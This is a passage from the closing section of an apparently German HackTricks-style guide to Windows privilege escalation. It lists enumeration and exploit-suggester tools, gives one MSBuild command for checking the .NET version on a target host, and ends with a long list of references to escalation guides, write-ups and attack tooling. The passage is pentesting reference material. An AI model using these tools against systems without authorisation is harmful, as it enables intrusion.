[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft mögliche Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool basierend auf diesem Post (benötigt accesschk nicht, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der korrekten Version von .NET kompilieren ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Opfer-Host zu sehen, kannst du:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referenzen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
